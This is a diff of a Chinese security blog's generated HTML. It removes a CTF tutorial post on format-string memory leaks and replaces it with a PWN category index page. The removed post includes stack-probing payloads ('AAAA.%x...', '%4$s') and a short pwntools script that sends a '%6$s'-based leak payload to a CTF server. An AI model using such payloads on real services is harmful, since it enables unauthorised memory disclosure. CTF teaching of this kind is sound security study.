@@ -22,20 +22,18 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="找到内存对应参数位置1️⃣ 用 %x 或 %p 打印栈上的值 假设你的输入是： payload &#x3D; “AAAA.%x.%x.%x.%x.%x.%x”printf(payload); %x 会依次打印栈上的值 “AAAA” 的十六进制是 0x41414141 当你看到输出里出现 41414141 时，这个 %x 对应的就是你输入的值在栈上的参数序号 2️⃣ 举个例子 假设输出是： deadbeef.">
-<meta property="og:type" content="article">
+  <meta name="description" content="学习逆向贵在坚持">
+<meta property="og:type" content="website">
 <meta property="og:title" content="s0m1ng">
-<meta property="og:url" content="http://example.com/2025/09/03/PWN/pwn_attack/format_string/r_every_mem/index.html">
+<meta property="og:url" content="http://example.com/categories/PWN/PWN-ATTACK/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/index.html">
 <meta property="og:site_name" content="s0m1ng">
-<meta property="og:description" content="找到内存对应参数位置1️⃣ 用 %x 或 %p 打印栈上的值 假设你的输入是： payload &#x3D; “AAAA.%x.%x.%x.%x.%x.%x”printf(payload); %x 会依次打印栈上的值 “AAAA” 的十六进制是 0x41414141 当你看到输出里出现 41414141 时，这个 %x 对应的就是你输入的值在栈上的参数序号 2️⃣ 举个例子 假设输出是： deadbeef.">
+<meta property="og:description" content="学习逆向贵在坚持">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-09-03T10:23:14.087Z">
-<meta property="article:modified_time" content="2025-09-06T13:59:16.696Z">
 <meta property="article:author" content="s0m1ng">
 <meta property="article:tag" content="逆向，实战，外挂">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2025/09/03/PWN/pwn_attack/format_string/r_every_mem/">
+<link rel="canonical" href="http://example.com/categories/PWN/PWN-ATTACK/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/">
 
 
 <script id="page-configurations">
@@ -43,12 +41,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title> | s0m1ng</title>
+  <title>分类: PWN通用问题 | s0m1ng</title>
   
 
 
@@ -174,157 +172,91 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content category">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/03/PWN/pwn_attack/format_string/r_every_mem/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/profile_photo.jpg">
-      <meta itemprop="name" content="s0m1ng">
-      <meta itemprop="description" content="学习逆向贵在坚持">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="s0m1ng">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-09-03 18:23:14" itemprop="dateCreated datePublished" datetime="2025-09-03T18:23:14+08:00">2025-09-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-06 21:59:16" itemprop="dateModified" datetime="2025-09-06T21:59:16+08:00">2025-09-06</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
   
-  <h1 id="找到内存对应参数位置"><a href="#找到内存对应参数位置" class="headerlink" title="找到内存对应参数位置"></a>找到内存对应参数位置</h1><p>1️⃣ 用 %x 或 %p 打印栈上的值</p>
-<p>假设你的输入是：</p>
-<p>payload = “AAAA.%x.%x.%x.%x.%x.%x”<br>printf(payload);</p>
-<p>%x 会依次打印栈上的值</p>
-<p>“AAAA” 的十六进制是 0x41414141</p>
-<p>当你看到输出里出现 41414141 时，这个 %x 对应的就是你输入的值在栈上的参数序号</p>
-<p>2️⃣ 举个例子</p>
-<p>假设输出是：</p>
-<p>deadbeef.0.1.41414141.2.3</p>
-<p>“41414141” 出现在第 4 个 %x 的位置</p>
-<p>那么你输入的地址就是栈上的 第 4 个参数</p>
-<p>如果你想用 %s 泄露，这里就用 %4$s</p>
-<h1 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意"></a>特别注意</h1><p>x32可以用fmtarg来看参数位置，但是x64不行，因为x64的参数传递靠寄存器，如果你是%1$s是RSI,%2$s是RDX，%3$s是RCX，%4$s是R8，%5$s是R9，%6$s开始就是payload了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&#x27;gz.imxbt.cn&#x27;,20959)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload = p32(0x0804a020) + b&quot;%6$s&quot;      # 0x0804a020 是你想要泄露的地址,程序中有read函数，这个时候把payload读进内存，这个时候0x0804a020就进栈了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =b&quot;%6$saaaa&quot;+p32(0x0804a020)    #一定得这么写，因为地址里高位有0，printf遇到0直接结束</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-
-
-
-    
-    
-    
-        <div class="reward-container">
-  <div>您的支持将鼓励我继续创作!</div>
-  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
-    打赏
-  </button>
-  <div id="qr" style="display: none;">
-      
-      <div style="display: inline-block;">
-        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
-        <p>微信支付</p>
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <h2 class="collection-header">PWN通用问题
+          <small>分类</small>
+        </h2>
       </div>
 
-  </div>
-</div>
+      
+    <div class="collection-year">
+      <span class="collection-header">2026</span>
+    </div>
 
-        
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>s0m1ng
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="http://example.com/2025/09/03/PWN/pwn_attack/format_string/r_every_mem/" title="">http://example.com/2025/09/03/PWN/pwn_attack/format_string/r_every_mem/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2026-03-15T00:00:00+08:00"
+              content="2026-03-15">
+          03-15
+        </time>
+      </div>
 
-        
-
-  <div class="followme">
-    <p>欢迎关注我的其它发布渠道</p>
-
-    <div class="social-list">
-
-        <div class="social-item">
-          <a target="_blank" class="social-link" href="/atom.xml">
-            <span class="icon">
-              <i class="fa fa-rss"></i>
-            </span>
-
-            <span class="label">RSS</span>
+      <div class="post-title">
+          <a class="post-title-link" href="/2026/03/15/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E6%96%AD%E7%BD%91%E5%90%8E%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%9F%A5%E8%AF%A2/" itemprop="url">
+            <span itemprop="name">线下赛知识查询</span>
           </a>
-        </div>
+      </div>
+
+    </header>
+  </article>
+
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2026-03-14T21:45:00+08:00"
+              content="2026-03-14">
+          03-14
+        </time>
+      </div>
+
+      <div class="post-title">
+          <a class="post-title-link" href="/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E5%BC%BA%E5%88%B6%E8%AE%A9elf%E9%93%BE%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%9A%84libc/" itemprop="url">
+            <span itemprop="name">PWN环境配置：强制ELF加载指定libc</span>
+          </a>
+      </div>
+
+    </header>
+  </article>
+
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2026-03-14T21:30:00+08:00"
+              content="2026-03-14">
+          03-14
+        </time>
+      </div>
+
+      <div class="post-title">
+          <a class="post-title-link" href="/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F/" itemprop="url">
+            <span itemprop="name">PWN输出机制与泄露接收指南</span>
+          </a>
+      </div>
+
+    </header>
+  </article>
+
     </div>
   </div>
-
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/05/14/PWN/pwn_defense/awd/awd/" rel="prev" title="AWD summary for pwn players">
-      <i class="fa fa-chevron-left"></i> AWD summary for pwn players
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/09/03/PWN/pwn_attack/format_string/w_every_addr/" rel="next" title="">
-       <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
   
   
+  
+
   
 
 
@@ -377,7 +309,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E5%86%85%E5%AD%98%E5%AF%B9%E5%BA%94%E5%8F%82%E6%95%B0%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">找到内存对应参数位置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F"><span class="nav-number">2.</span> <span class="nav-text">特别注意</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -393,17 +324,17 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
